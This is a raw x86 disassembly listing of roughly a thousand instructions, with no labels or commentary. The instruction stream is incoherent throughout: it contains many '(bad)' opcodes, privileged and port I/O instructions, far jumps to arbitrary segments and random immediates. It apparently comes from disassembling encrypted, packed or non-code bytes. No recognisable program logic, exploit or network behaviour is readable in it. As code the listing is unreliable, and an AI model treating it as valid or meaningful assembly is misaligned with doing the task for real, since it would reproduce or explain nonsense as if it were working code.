  4071a7:	enter  0x3fed,0xb1
  4071ab:	xor    eax,DWORD PTR [ebx]
  4071ad:	inc    edi
  4071ae:	pop    edx
  4071af:	mov    ah,0xdb
  4071b1:	sub    cl,BYTE PTR [edi-0x4bdd7ab]
  4071b7:	jle    0x40718b
  4071b9:	cli    
  4071ba:	sub    eax,0xd41368bf
  4071bf:	jae    0x407181
  4071c1:	je     0x40720e
  4071c3:	mov    esp,0xc99b2151
  4071c8:	jecxz  0x407156
  4071ca:	imul   eax,DWORD PTR [ebp-0x4673a732],0xa1c3d773
  4071d4:	mov    ebx,0xac75144d
  4071d9:	mov    dh,0xbd
  4071db:	mov    BYTE PTR [ebp-0x7d],al
  4071de:	je     0x407252
  4071e0:	repnz pop esp
  4071e2:	sti    
  4071e3:	xchg   ebp,eax
  4071e4:	push   ds
  4071e5:	pop    eax
  4071e6:	fidiv  DWORD PTR [ebx+eax*8]
  4071e9:	mov    edi,0xb1415c6f
  4071ee:	pushf  
  4071ef:	xchg   esi,eax
  4071f0:	ins    DWORD PTR es:[edi],dx
  4071f1:	pop    ds
  4071f2:	lods   eax,DWORD PTR ds:[esi]
  4071f3:	push   ds
  4071f4:	pop    ecx
  4071f5:	add    edx,ebx
  4071f7:	xor    bh,BYTE PTR [edx]
  4071f9:	inc    ecx
  4071fa:	inc    ebx
  4071fb:	xchg   BYTE PTR [ecx-0x31],bl
  4071fe:	std    
  4071ff:	daa    
  407200:	cmp    edx,eax
  407202:	xor    DWORD PTR [eax-0x47b45a3],ebx
  407208:	and    cl,dl
  40720a:	sbb    esi,DWORD PTR [edx+0x74]
  40720d:	jns    0x407261
  40720f:	ret    
  407210:	mov    dh,0x22
  407212:	lods   eax,DWORD PTR ds:[esi]
  407213:	call   0xd145831e
  407218:	mov    WORD PTR [edx],?
  40721a:	scas   al,BYTE PTR es:[edi]
  40721b:	test   al,0x6e
  40721d:	push   0xb8e9423e
  407222:	hlt    
  407223:	shr    dh,0xd0
  407226:	mov    al,ds:0xbd556eec
  40722b:	mov    dh,0x91
  40722d:	call   0xb8d4b817
  407232:	out    dx,eax
  407233:	mov    ecx,0x6a65db35
  407238:	shl    BYTE PTR [edi+0xf],cl
  40723b:	les    eax,FWORD PTR [edi-0x55c93850]
  407241:	pop    edi
  407242:	outs   dx,BYTE PTR ds:[esi]
  407243:	in     al,0x90
  407245:	(bad)  
  407247:	sbb    DWORD PTR [ebx-0x5],edi
  40724a:	jecxz  0x40726b
  40724c:	xor    eax,0xd6a0b22d
  407251:	arpl   si,cx
  407253:	(bad)  
  407254:	sub    edx,DWORD PTR [ecx-0x5619abdb]
  40725a:	imul   esp,esi,0xf3f374c8
  407260:	inc    ecx
  407261:	mov    WORD PTR [esi+0x292e193f],gs
  407267:	sar    DWORD PTR [ebx],1
  407269:	scas   eax,DWORD PTR es:[edi]
  40726a:	arpl   sp,si
  40726c:	mov    al,ds:0xedff1d03
  407271:	cmp    eax,0x6a7090af
  407276:	iret   
  407277:	cmp    eax,0xf15046b6
  40727c:	shr    eax,1
  40727e:	jnp    0x407205
  407280:	adc    DWORD PTR [esi-0x1b18ec2d],edx
  407286:	ret    0x985b
  407289:	outs   dx,BYTE PTR ds:[esi]
  40728a:	and    al,0x41
  40728c:	gs pop eax
  40728e:	outs   dx,DWORD PTR ds:[esi]
  40728f:	push   edi
  407290:	push   eax
  407291:	mov    cl,0x6
  407293:	jnp    0x4072d2
  407295:	adc    al,0x1b
  407297:	stos   BYTE PTR es:[edi],al
  407298:	call   0x85ca29d
  40729d:	ins    BYTE PTR es:[edi],dx
  40729e:	pop    ebx
  40729f:	es jmp 0xd5fe2851
  4072a5:	in     al,dx
  4072a6:	dec    eax
  4072a7:	mov    bh,0xf7
  4072a9:	xchg   ch,ah
  4072ab:	sub    al,0x9
  4072ad:	popf   
  4072ae:	and    BYTE PTR [ebp+ecx*8-0x14351e63],ch
  4072b5:	pop    esi
  4072b6:	pop    ebx
  4072b7:	retf   0xafd7
  4072ba:	inc    ecx
  4072bb:	or     al,0xd7
  4072bd:	mov    bl,0x2f
  4072bf:	fistp  DWORD PTR [edi]
  4072c1:	xchg   ecx,esp
  4072c3:	sbb    BYTE PTR [ecx+0x27],bl
  4072c6:	mov    cl,0xbe
  4072c8:	inc    esp
  4072c9:	nop
  4072ca:	pop    ss
  4072cb:	out    dx,al
  4072cc:	popf   
  4072cd:	xor    BYTE PTR [edi-0x30401a6b],cl
  4072d3:	test   edx,edi
  4072d5:	dec    edx
  4072d6:	dec    esp
  4072d7:	cdq    
  4072d8:	enter  0xb5b9,0xc1
  4072dc:	xor    eax,0x78aaffc
  4072e1:	adc    eax,0x4ff0d36
  4072e6:	repz mov ecx,0xf5a406d0
  4072ec:	jmp    0xa8cf74e5
  4072f1:	aam    0xe2
  4072f3:	mov    ebx,0x43684567
  4072f8:	dec    edi
  4072f9:	pop    edx
  4072fa:	pop    esi
  4072fb:	xor    ch,ch
  4072fd:	ins    BYTE PTR es:[edi],dx
  4072fe:	retf   
  4072ff:	daa    
  407300:	in     al,dx
  407301:	mov    DWORD PTR [esi+esi*8-0x74],0xb22311f5
  407309:	mov    edi,0x79f4ccde
  40730e:	jnp    0x40731e
  407310:	mov    ebx,0x410b1fa
  407315:	jne    0x40736a
  407317:	fcom   DWORD PTR [ecx+0x13e87142]
  40731d:	gs je  0x4072fe
  407320:	jecxz  0x407348
  407322:	push   ebx
  407323:	fsubr  st(6),st
  407325:	dec    ebx
  407326:	jae    0x407359
  407328:	popf   
  407329:	mov    esi,0x3d9bc3e0
  40732e:	aaa    
  40732f:	inc    edx
  407330:	es cld 
  407332:	mov    ebx,0xea2bba87
  407337:	xchg   ebp,eax
  407338:	ja     0x4073aa
  40733a:	adc    bl,BYTE PTR [edi-0x31]
  40733d:	jnp    0x407386
  40733f:	(bad)  
  407340:	mov    ch,0xf1
  407342:	pop    esp
  407343:	ret    0xd043
  407346:	sbb    BYTE PTR [eax],dh
  407348:	cli    
  407349:	test   DWORD PTR [eax],eax
  40734b:	sbb    BYTE PTR [eax+0x1be4fe95],bh
  407351:	xchg   esp,eax
  407352:	(bad)  
  407353:	dec    edi
  407354:	jl     0x407384
  407356:	sub    DWORD PTR [edx-0x59f3108c],edx
  40735c:	sbb    DWORD PTR [ecx+ebp*1+0x54],ebx
  407360:	xlat   BYTE PTR ds:[ebx]
  407361:	retf   0xec45
  407364:	add    eax,0x572cb604
  407369:	push   0x9503c161
  40736e:	inc    BYTE PTR [edi-0x75]
  407371:	aam    0xf5
  407373:	imul   esp,DWORD PTR [esi],0x65
  407376:	cmp    al,bh
  407378:	xchg   edi,eax
  407379:	ds test al,0x37
  40737c:	into   
  40737d:	push   edi
  40737e:	in     eax,0x0
  407380:	pusha  
  407381:	sbb    BYTE PTR [edi],dl
  407383:	xor    eax,0xba69af3b
  407388:	shr    edx,0xae
  40738b:	(bad)  
  40738c:	adc    BYTE PTR [eax+edx*8+0x26],bl
  407390:	inc    ebp
  407391:	jg     0x407379
  407393:	arpl   bp,cx
  407395:	(bad)  
  407396:	cmp    al,0x3f
  407398:	test   eax,0x45753d1a
  40739d:	retf   
  40739e:	rol    ecx,0xe6
  4073a1:	sub    al,0xd5
  4073a3:	dec    ebx
  4073a4:	bound  eax,QWORD PTR [esi-0x32]
  4073a7:	into   
  4073a8:	outs   dx,DWORD PTR ds:[esi]
  4073a9:	xor    eax,0x915bd29
  4073ae:	cmp    cl,BYTE PTR [ebp+0x22]
  4073b1:	test   DWORD PTR [ecx+0x707387c3],esp
  4073b7:	inc    ebx
  4073b8:	and    eax,DWORD PTR [esi-0x1c]
  4073bb:	cmp    DWORD PTR [esi],0x18
  4073be:	adc    al,al
  4073c0:	icebp  
  4073c1:	fisub  WORD PTR [eax+0x3d5968d5]
  4073c7:	jecxz  0x407386
  4073c9:	into   
  4073ca:	add    eax,0x6b2d197b
  4073cf:	jbe    0x407361
  4073d1:	aad    0x98
  4073d3:	rcr    DWORD PTR [ebx+ebp*8],cl
  4073d6:	(bad)  
  4073d7:	push   cs
  4073d8:	pop    ss
  4073d9:	cmp    DWORD PTR [ecx-0x5b],esp
  4073dc:	lahf   
  4073dd:	jmp    0xd417:0xa5632b82
  4073e4:	outs   dx,DWORD PTR ds:[esi]
  4073e5:	push   ecx
  4073e6:	inc    eax
  4073e7:	inc    edx
  4073e8:	js     0x407445
  4073ea:	pushf  
  4073eb:	inc    ebp
  4073ec:	int3   
  4073ed:	and    al,0x66
  4073ef:	aaa    
  4073f0:	leavew 
  4073f2:	xor    BYTE PTR [esi-0xb5135ef],al
  4073f8:	ja     0x40741f
  4073fa:	and    edx,DWORD PTR [edi-0x5f]
  4073fd:	das    
  4073fe:	aad    0x55
  407400:	adc    bh,BYTE PTR [edi]
  407402:	jle    0x407419
  407404:	ret    
  407405:	cs dec ebp
  407407:	into   
  407408:	out    dx,al
  407409:	pop    ebx
  40740a:	xchg   edx,eax
  40740b:	rol    BYTE PTR [ecx+ecx*4-0x5a],1
  40740f:	mov    esp,0xe222c8a8
  407414:	adc    eax,0xd4c41a10
  407419:	mov    esi,0xf7a213a2
  40741e:	jl     0x4073b7
  407420:	xor    eax,0x93ab2684
  407425:	test   eax,0xb452a4cc
  40742a:	or     edx,esp
  40742c:	aad    0x95
  40742e:	pushf  
  40742f:	(bad)  
  407430:	retf   0x39b2
  407433:	cmp    eax,eax
  407435:	adc    dh,BYTE PTR [ebx-0x77d51fb0]
  40743b:	xchg   edx,eax
  40743c:	dec    DWORD PTR [edx]
  40743e:	loopne 0x407480
  407440:	dec    edx
  407441:	mov    bl,0xe7
  407443:	(bad)  [bp+di+0x22]
  407447:	add    al,0xfd
  40744a:	pop    es
  40744b:	mov    ecx,0x6707ecd4
  407450:	int    0x4f
  407452:	rcl    al,cl
  407454:	std    
  407455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407456:	daa    
  407457:	mov    cl,0x8b
  407459:	bound  edi,QWORD PTR [edx+0x2a]
  40745c:	aaa    
  40745d:	xlat   BYTE PTR ds:[ebx]
  40745e:	daa    
  40745f:	test   DWORD PTR [eax*2-0x498e5228],edi
  407466:	lods   al,BYTE PTR ds:[esi]
  407467:	jno    0x407440
  407469:	sbb    DWORD PTR [eax+edx*2-0x47b2757f],ecx
  407470:	bnd jge 0x4074d4
  407473:	cdq    
  407474:	call   0xaa95:0x87bcdcf3
  40747b:	adc    al,dh
  40747d:	aad    0x3
  40747f:	dec    ecx
  407480:	daa    
  407481:	les    eax,FWORD PTR [ecx]
  407483:	test   BYTE PTR ss:[esi],bh
  407486:	xchg   ebx,eax
  407487:	xchg   esi,eax
  407488:	and    eax,0x44b67052
  40748d:	dec    ebx
  40748e:	inc    esp
  40748f:	icebp  
  407490:	fs mov bl,0x43
  407493:	and    esi,DWORD PTR [edx+0x34]
  407496:	cmp    edx,0xffffffce
  407499:	xchg   BYTE PTR [edx-0x35],cl
  40749c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40749d:	pop    ebx
  40749e:	dec    ecx
  40749f:	repz enter 0x4184,0x78
  4074a4:	sti    
  4074a5:	xchg   edx,eax
  4074a6:	mov    ecx,0xeaadb446
  4074ab:	pop    es
  4074ac:	sub    BYTE PTR [edx+eiz*2-0x3aa385f3],bl
  4074b3:	cld    
  4074b4:	inc    eax
  4074b5:	jno    0x4074df
  4074b7:	es adc dh,al
  4074ba:	inc    eax
  4074bb:	lock mov eax,ds:0x995b136a
  4074c1:	scas   eax,DWORD PTR es:[edi]
  4074c2:	mov    eax,ds:0x4d38d9ef
  4074c7:	add    edx,ebx
  4074c9:	jns    0x407460
  4074cb:	pop    ss
  4074cc:	ins    DWORD PTR es:[edi],dx
  4074cd:	into   
  4074ce:	mov    ch,0x15
  4074d0:	pop    ebp
  4074d1:	push   edx
  4074d2:	mov    bh,0x3e
  4074d4:	push   DWORD PTR [ecx-0x80]
  4074d7:	fbld   TBYTE PTR [eax]
  4074d9:	addr16 int 0xc9
  4074dc:	es add eax,0x9712c33d
  4074e2:	jnp    0x40750a
  4074e4:	sub    eax,0x5442620d
  4074e9:	dec    esi
  4074ea:	fnstcw WORD PTR [ecx-0x25]
  4074ed:	adc    DWORD PTR [esi],ebp
  4074ef:	js     0x407520
  4074f1:	(bad)  
  4074f2:	fidiv  DWORD PTR [ebp+0x73]
  4074f5:	mov    gs,WORD PTR [eax+0x11]
  4074f8:	cmp    al,0x11
  4074fa:	repnz test eax,0x536f88cb
  407500:	dec    esi
  407501:	mov    esi,0xb2a0e134
  407506:	pop    eax
  407507:	shl    DWORD PTR [edx+0x2f],1
  40750a:	sbb    esi,DWORD PTR [edi]
  40750c:	ja     0x4074bd
  40750e:	or     BYTE PTR [edi+eiz*1+0x34],cl
  407512:	fstp   TBYTE PTR [ebx-0x197f3cd2]
  407518:	sbb    dl,dh
  40751a:	dec    edx
  40751b:	inc    ecx
  40751c:	in     eax,dx
  40751d:	or     DWORD PTR [esi-0x2d],ebp
  407520:	adc    ah,BYTE PTR [ebx]
  407522:	lods   al,BYTE PTR ds:[esi]
  407523:	cmp    eax,0xeb16d24c
  407528:	dec    ah
  40752a:	pop    ebp
  40752b:	(bad)
  40752f:	pusha  
  407530:	popa   
  407531:	in     eax,dx
  407532:	jb     0x40757d
  407534:	inc    eax
  407535:	shr    ebp,0x1c
  407538:	into   
  407539:	je     0x40754d
  40753b:	pusha  
  40753c:	pop    edi
  40753d:	mov    ah,0x0
  40753f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407540:	inc    ebp
  407541:	jbe    0x40758d
  407543:	adc    DWORD PTR [ecx],0x785349ba
  407549:	sbb    cl,BYTE PTR ds:[ecx+edi*4]
  40754d:	sub    DWORD PTR [ecx],esi
  40754f:	aam    0x48
  407551:	jno    0x4074f0
  407553:	push   ebx
  407554:	pop    ds
  407555:	iret   
  407556:	dec    esi
  407557:	inc    edi
  407558:	add    eax,0xdc515e34
  40755d:	dec    ebx
  40755e:	std    
  40755f:	and    cl,BYTE PTR [ebp+0x782011de]
  407565:	push   edi
  407566:	dec    esp
  407567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407568:	cwde   
  407569:	and    al,0x5f
  40756b:	jns    0x40753d
  40756d:	dec    ecx
  40756e:	dec    edx
  40756f:	fdiv   QWORD PTR [esi+0x31c4acc3]
  407575:	jnp    0x4075dd
  407577:	or     eax,0x4a69d2d5
  40757c:	mov    ecx,0xff56f16c
  407581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407582:	call   0x7121cd46
  407587:	loop   0x407562
  407589:	in     eax,dx
  40758a:	sub    ecx,edx
  40758c:	adc    esp,DWORD PTR ds:[esi]
  40758f:	xor    ebp,DWORD PTR [eax+0x6f680290]
  407595:	bnd jae 0x407573
  407598:	retf   
  407599:	jb     0x407522
  40759b:	cmp    ecx,DWORD PTR [ebx+0x6]
  40759e:	jmp    0x67d890eb
  4075a3:	inc    edx
  4075a4:	push   ds
  4075a5:	xlat   BYTE PTR ds:[ebx]
  4075a6:	mov    ds:0xb8059391,eax
  4075ab:	iret   
  4075ac:	pop    esp
  4075ad:	fisttp QWORD PTR [edx+0x64d925d0]
  4075b3:	inc    edx
  4075b4:	xor    al,dl
  4075b6:	jbe    0x407574
  4075b8:	(bad)  ss:[ebp+eiz*8-0x2077fd56]
  4075c0:	lahf   
  4075c1:	scas   eax,DWORD PTR es:[edi]
  4075c2:	or     edi,esp
  4075c4:	in     eax,dx
  4075c5:	sub    BYTE PTR es:[ebx+0xc67c99e],ah
  4075cc:	mov    al,ds:0xb5284906
  4075d1:	xlat   BYTE PTR ds:[ebx]
  4075d2:	repz ficom DWORD PTR [esi-0x2e4ef525]
  4075d9:	retf   
  4075da:	pusha  
  4075db:	or     al,0x93
  4075dd:	mov    esi,0xecadb6ea
  4075e2:	lahf   
  4075e3:	mov    ds:0x8ecfc639,al
  4075e8:	(bad)  
  4075e9:	(bad)  
  4075eb:	sar    DWORD PTR ss:[eax+0x45],cl
  4075ef:	(bad)  
  4075f0:	pop    ecx
  4075f1:	sub    al,0xb0
  4075f3:	and    eax,0x87b4f5b6
  4075f8:	pop    edx
  4075f9:	mov    DWORD PTR [edx+ebx*1-0x349350a5],ecx
  407600:	jno    0x4075e4
  407602:	xchg   ebp,eax
  407603:	repnz adc DWORD PTR [esi],ebx
  407606:	mov    ch,0x17
  407608:	sbb    al,0xa5
  40760a:	add    al,0x50
  40760c:	xor    ecx,DWORD PTR [eax+0x7f]
  40760f:	pop    es
  407610:	adc    al,0xd9
  407612:	loope  0x407649
  407614:	lock or BYTE PTR [edx],al
  407617:	ds xchg esi,eax
  407619:	dec    edx
  40761a:	xor    BYTE PTR [ecx+eiz*2+0x657cf73a],al
  407621:	clc    
  407622:	fmul   DWORD PTR [ebx+0x1d]
  407625:	mov    ah,0x5a
  407627:	sbb    edx,DWORD PTR [si+0xe5e]
  40762c:	cmc    
  40762d:	hlt    
  40762e:	push   ebx
  40762f:	pop    eax
  407630:	sub    BYTE PTR [edi+ebx*1+0xd9efa47],ah
  407637:	fcomp  QWORD PTR [esi-0x79]
  40763a:	adc    BYTE PTR [eax+0x21],dh
  40763d:	shl    BYTE PTR [ebp+0x408a7128],1
  407643:	imul   edx,DWORD PTR [ebx],0x6b
  407646:	scas   eax,DWORD PTR es:[edi]
  407647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407648:	dec    eax
  407649:	sub    al,0x9e
  40764b:	or     ah,dh
  40764d:	ret    
  40764e:	cmp    BYTE PTR [ebx-0x45e02da8],al
  407654:	xchg   edi,eax
  407655:	xchg   DWORD PTR [ecx+0x49],ebp
  407658:	xchg   esp,eax
  407659:	inc    esi
  40765a:	sti    
  40765b:	mov    WORD PTR [edx],ss
  40765d:	xchg   DWORD PTR [ecx],ecx
  40765f:	ins    BYTE PTR es:[edi],dx
  407660:	sbb    cl,BYTE PTR [eax-0x55]
  407663:	data16 jbe 0x4075fa
  407666:	xchg   edi,eax
  407667:	dec    ecx
  407668:	push   ecx
  407669:	xor    eax,0x2b1f2a08
  40766e:	or     DWORD PTR ds:0x6d73fd1,0x37
  407675:	push   eax
  407676:	push   0x61
  407678:	inc    esi
  407679:	data16 addr16 ja 0x40761a
  40767d:	jecxz  0x407664
  40767f:	xchg   edx,eax
  407680:	out    dx,al
  407681:	pushf  
  407682:	out    dx,al
  407683:	lods   al,BYTE PTR ds:[esi]
  407684:	aad    0x95
  407686:	mov    esi,0x37a71359
  40768b:	test   esi,edi
  40768d:	xchg   ebx,eax
  40768e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40768f:	dec    eax
  407690:	inc    ebp
  407691:	mov    ch,0xc1
  407693:	adc    al,0x5b
  407695:	in     eax,0x9b
  407697:	mov    al,ds:0x33b9fdd3
  40769c:	retf   
  40769d:	jge    0x40764f
  40769f:	mov    ds:0x10b10770,eax
  4076a4:	aam    0x8c
  4076a6:	push   ebp
  4076a7:	pop    ss
  4076a8:	or     al,0xaa
  4076aa:	sbb    bh,BYTE PTR [ebx-0x7bdb9e16]
  4076b0:	out    dx,eax
  4076b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076b2:	rcr    BYTE PTR [edx],cl
  4076b4:	dec    edi
  4076b5:	gs loop 0x407715
  4076b8:	in     al,0x0
  4076ba:	mov    BYTE PTR [ecx+0x8],dl
  4076bd:	jae    0x40768b
  4076bf:	adc    ah,0x46
  4076c2:	xor    al,0x33
  4076c4:	pop    ecx
  4076c5:	push   edx
  4076c6:	sbb    bl,BYTE PTR [esi]
  4076c8:	xchg   esi,edi
  4076ca:	mov    dl,0x64
  4076cc:	xor    ch,ah
  4076ce:	sar    BYTE PTR [esi-0x44f1fa0b],0x5d
  4076d5:	fs (bad) 
  4076d7:	aas    
  4076d8:	or     ch,dl
  4076da:	cmp    ebx,DWORD PTR [ebx+eiz*2+0x2ba1f482]
  4076e1:	inc    edx
  4076e2:	sbb    DWORD PTR [eax],0x3cb583b7
  4076e8:	xor    dh,BYTE PTR [esi+0x2a]
  4076eb:	sub    BYTE PTR [ebp-0x70b28250],ch
  4076f1:	aaa    
  4076f2:	addr16 xor al,0xc7
  4076f5:	sbb    ebx,DWORD PTR [eax]
  4076f7:	push   eax
  4076f8:	ret    0x3fb6
  4076fb:	xchg   edi,eax
  4076fc:	fimul  DWORD PTR [ecx-0x27]
  4076ff:	mov    ecx,esi
  407701:	fs push 0xffffffa6
  407704:	sbb    DWORD PTR ss:[eax+0x3f],ebx
  407708:	push   ss
  407709:	add    al,BYTE PTR [esi]
  40770b:	jb     0x40773d
  40770d:	inc    eax
  40770e:	mov    BYTE PTR [esi-0x3b],ch
  407711:	pop    ds
  407712:	rcr    eax,cl
  407714:	js     0x4076bb
  407716:	call   0x4118:0x7582f952
  40771d:	sbb    cl,al
  40771f:	pushf  
  407720:	push   0xffffffd5
  407722:	in     eax,dx
  407723:	call   0x33fa74ee
  407728:	(bad)  
  407729:	(bad)  
  40772a:	(bad)  
  40772e:	int    0xef
  407730:	fwait
  407731:	xchg   edx,eax
  407732:	mov    ds:0x53679bea,eax
  407737:	in     eax,dx
  407738:	jae    0x4077b4
  40773a:	mov    ah,dl
  40773c:	pop    edi
  40773d:	pop    es
  40773e:	out    dx,al
  40773f:	jmp    0x40771d
  407741:	sahf   
  407742:	out    dx,al
  407743:	in     eax,dx
  407744:	push   ebx
  407745:	add    DWORD PTR [ecx-0x13f59492],ecx
  40774b:	pop    ecx
  40774c:	dec    ebp
  40774d:	mov    eax,0x806b8edd
  407752:	enter  0x828b,0x46
  407756:	stc    
  407757:	add    ebp,esi
  407759:	jge    0x407711
  40775b:	(bad)  
  40775c:	call   0xa18e652d
  407761:	sbb    DWORD PTR [ecx],esp
  407763:	sbb    esi,edi
  407765:	mov    edi,0xaef1a8e3
  40776a:	mov    eax,gs:0x1685c310
  407770:	in     eax,0x4d
  407772:	jb     0x407744
  407774:	call   0x6331:0x305f2dbf
  40777b:	adc    ebx,0xfffffff5
  40777e:	add    edi,DWORD PTR [eax+0xc]
  407781:	pushf  
  407782:	clc    
  407783:	out    dx,eax
  407784:	push   0x19
  407786:	lods   al,BYTE PTR fs:[esi]
  407788:	sub    BYTE PTR [eax],0xb0
  40778b:	dec    edx
  40778c:	sub    eax,0xc84257e9
  407791:	mov    ch,0xff
  407793:	pop    ds
  407794:	aas    
  407795:	scas   eax,DWORD PTR es:[edi]
  407796:	cmp    al,0xbe
  407798:	jmp    0x89d2dec2
  40779d:	sub    ch,BYTE PTR [edi]
  40779f:	dec    edi
  4077a0:	mov    al,0xa8
  4077a2:	pop    ss
  4077a3:	cdq    
  4077a4:	mov    al,0x53
  4077a6:	sbb    eax,0x9a462fa9
  4077ab:	and    eax,0xa1c1e3c3
  4077b0:	enter  0x4966,0xa4
  4077b4:	push   ds
  4077b5:	and    DWORD PTR [ebx+0x2e],ebx
  4077b8:	xor    al,BYTE PTR [ecx+0x37]
  4077bb:	ror    DWORD PTR [edx],0x42
  4077be:	jecxz  0x4077e2
  4077c0:	sbb    al,0xe4
  4077c2:	push   esp
  4077c3:	mov    ebp,DWORD PTR [ecx]
  4077c5:	jnp    0x4077e3
  4077c7:	jecxz  0x407781
  4077c9:	adc    DWORD PTR [esi+0x31],ebx
  4077cc:	xchg   DWORD PTR [ecx-0x76307f0a],ebp
  4077d2:	ror    BYTE PTR [edx-0x38],1
  4077d5:	adc    BYTE PTR [ecx-0x79],al
  4077d8:	xlat   BYTE PTR ds:[ebx]
  4077d9:	ja     0x40781c
  4077db:	test   BYTE PTR [ecx+0x1aab6457],cl
  4077e1:	mov    ecx,DWORD PTR [edi+0x6da11133]
  4077e7:	inc    ebx
  4077e8:	mov    edx,0x21e40bac
  4077ed:	cld    
  4077ee:	xchg   BYTE PTR [esi+0x3b],bh
  4077f1:	xchg   ebp,eax
  4077f2:	ss pop ebx
  4077f4:	ror    BYTE PTR [esi+ecx*8],cl
  4077f7:	jl     0x407826
  4077f9:	mov    dl,0xd4
  4077fb:	mov    fs,eax
  4077fd:	push   0x7ce49c61
  407802:	in     al,dx
  407803:	leave  
  407804:	and    DWORD PTR [esi+0x3],ebx
  407807:	adc    BYTE PTR ds:0x935bfb10,bh
  40780d:	gs lock inc ebp
  407810:	mov    dh,0xba
  407812:	mov    ds:0x6de710ac,al
  407817:	test   eax,0xa832e9b8
  40781c:	daa    
  40781d:	fwait
  40781e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40781f:	dec    ebp
  407820:	or     esp,esp
  407822:	sub    cl,BYTE PTR [ebx-0x3c]
  407825:	(bad)  
  407826:	mov    edx,0x4b65abf8
  40782b:	add    BYTE PTR [ebp+0x7e],0x25
  40782f:	cli    
  407830:	sub    bh,BYTE PTR [eax]
  407832:	xor    al,0xc
  407834:	pop    ebx
  407835:	ins    BYTE PTR es:[edi],dx
  407836:	ja     0x40786a
  407838:	xchg   edx,eax
  407839:	sbb    esp,DWORD PTR [edi+0x7b6224ed]
  40783f:	jne    0x4077fe
  407841:	call   0x9cea468c
  407846:	popf   
  407847:	pop    ecx
  407848:	shr    DWORD PTR [ebx-0x4163c4c1],0x8d
  40784f:	or     ebp,DWORD PTR [edx+0x2f13dbf6]
  407855:	in     al,dx
  407856:	imul   eax,DWORD PTR [edi],0x65e64599
  40785c:	outs   dx,BYTE PTR ds:[esi]
  40785d:	push   esi
  40785e:	inc    eax
  40785f:	div    DWORD PTR [eax-0x60b3b273]
  407865:	jo     0x40780a
  407867:	aam    0x25
  407869:	pop    es
  40786a:	retf   
  40786b:	fidiv  WORD PTR [esi-0x1e6550da]
  407871:	and    ebx,0x675f0060
  407877:	mov    dh,0xd1
  407879:	aaa    
  40787a:	dec    ebp
  40787b:	imul   ebx,DWORD PTR [esi+0x13a3d87d],0xffffffb8
  407882:	ret    0x9492
  407885:	nop
  407886:	cmc    
  407887:	nop
  407888:	jo     0x4078f6
  40788a:	jne    0x4078df
  40788c:	fcmovbe st,st(1)
  40788e:	fist   DWORD PTR [eax-0x36]
  407891:	cmp    BYTE PTR [ebp+ecx*2-0x30],cl
  407895:	mov    ?,WORD PTR [ecx]
  407897:	arpl   WORD PTR [esi+0x41245a1f],bx
  40789d:	imul   ecx,ebp,0xe88d251a
  4078a3:	mov    ch,0xdb
  4078a5:	clc    
  4078a6:	mov    esi,0x649e0141
  4078ab:	sbb    eax,0x8e774149
  4078b0:	sub    ebx,DWORD PTR [edi+0x59]
  4078b3:	cmp    BYTE PTR [ebp+0x2ff995c],bl
  4078b9:	test   dl,0xe6
  4078bc:	lods   eax,DWORD PTR ds:[esi]
  4078bd:	ffreep st(6)
  4078bf:	sub    BYTE PTR [ecx],bh
  4078c1:	ror    DWORD PTR [esi-0xc],1
  4078c4:	dec    edi
  4078c5:	sbb    ch,cl
  4078c7:	cwde   
  4078c8:	in     al,dx
  4078c9:	xor    dh,dl
  4078cb:	xchg   esp,eax
  4078cc:	in     eax,0xd7
  4078ce:	dec    edx
  4078cf:	es retf 0x83f
  4078d3:	dec    ebp
  4078d4:	add    al,0x7c
  4078d6:	sub    eax,0x37b0251a
  4078db:	pop    ds
  4078dc:	xchg   esi,eax
  4078dd:	mov    al,ch
  4078df:	sub    ebx,ecx
  4078e1:	add    eax,DWORD PTR [ecx]
  4078e3:	bswap  edi
  4078e5:	dec    ebx
  4078e6:	mov    ds:0x86083f7a,al
  4078eb:	je     0x40787f
  4078ed:	jae    0x4078e8
  4078ef:	push   ebx
  4078f0:	pop    es
  4078f1:	ins    BYTE PTR es:[edi],dx
  4078f2:	xchg   esi,eax
  4078f3:	fstp   DWORD PTR [edx+0x2d]
  4078f6:	ja     0x4078c1
  4078f8:	out    dx,eax
  4078f9:	push   edi
  4078fa:	(bad)  
  4078fb:	xchg   ecx,eax
  4078fc:	sub    dh,BYTE PTR [ebp-0x79]
  4078ff:	push   ds
  407900:	xor    ebx,eax
  407902:	cwde   
  407903:	daa    
  407904:	js     0x40789a
  407906:	sub    dh,BYTE PTR ds:0xfb19e339
  40790c:	and    BYTE PTR [ebx-0x20],al
  40790f:	xchg   DWORD PTR [eax+0x34],esi
  407912:	ret    
  407913:	retf   
  407914:	test   BYTE PTR [edi-0x69eb5814],ah
  40791a:	stc    
  40791b:	push   ecx
  40791c:	pop    esi
  40791d:	fld    TBYTE PTR ds:0x59c43075
  407923:	and    al,BYTE PTR [esi-0x194c0816]
  407929:	pop    ebp
  40792a:	add    al,0xb3
  40792c:	inc    ecx
  40792d:	jb     0x407947
  40792f:	sub    DWORD PTR [ebp+edi*8+0x45ccd1f0],edi
  407936:	or     al,0xce
  407938:	retf   
  407939:	rol    cl,cl
  40793b:	mov    bl,0x18
  40793d:	xchg   edi,eax
  40793e:	shl    DWORD PTR [edi+eiz*4+0x31],cl
  407942:	or     BYTE PTR [ecx+0x7dc4e875],bl
  407948:	retf   
  407949:	repnz cmp al,0x4e
  40794c:	jno    0x4078e8
  40794e:	mov    esi,0x1a19e16c
  407953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407954:	inc    esi
  407955:	mov    ebp,0xfb190620
  40795a:	jecxz  0x40792e
  40795c:	xor    BYTE PTR [edx],al
  40795e:	outs   dx,DWORD PTR ds:[esi]
  40795f:	xor    DWORD PTR [ecx+0x0],0xffffffcb
  407963:	loop   0x407949
  407965:	add    DWORD PTR [esi],eax
  407967:	iret   
  407968:	dec    edx
  407969:	jecxz  0x407971
  40796b:	aam    0xea
  40796d:	ret    0x3307
  407970:	mov    dl,0xae
  407972:	hlt    
  407973:	or     al,0xa7
  407975:	mov    edi,0xde06525e
  40797a:	imul   ebx,DWORD PTR [esi-0x3f0f509],0x60
